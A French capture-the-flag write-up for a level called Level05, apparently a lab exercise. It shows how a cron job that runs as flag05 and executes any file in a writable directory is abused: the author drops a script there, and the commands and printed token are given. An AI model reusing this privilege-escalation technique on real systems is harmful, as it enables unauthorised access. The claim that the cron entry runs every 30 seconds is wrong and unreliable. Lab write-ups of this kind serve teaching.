# Level05

À la connexion au niveau nous reçevons une notification :

<pre>You have new mail.</pre>

On consulte donc nos mails :

<pre>$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05</pre>

Le mail contient une tâche cron qui va exécuter <code>/usr/sbin/openarenaserver</code> toutes les 30 secondes avec les droits de flag05.

<pre>$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done</pre>

Ce script exécute tous les scripts contenus dans le dossier <code>/opt/openarenaserver/</code> puis les supprime.

On place donc un script qui exécute la commande getflag dans ce dossier :

<pre>$ echo "getflag > /tmp/token" > /tmp/getflag.sh
$ mv /tmp/getflag.sh /opt/openarenaserver/getflag.sh
$ ls /opt/openarenaserver/
getflag.sh</pre>

On attends que le fichier disparaisse pour récupérer notre résultat :

<pre>$ cat /tmp/token
Check flag.Here is your token : viuaaale9huek52boumoomioc</pre>
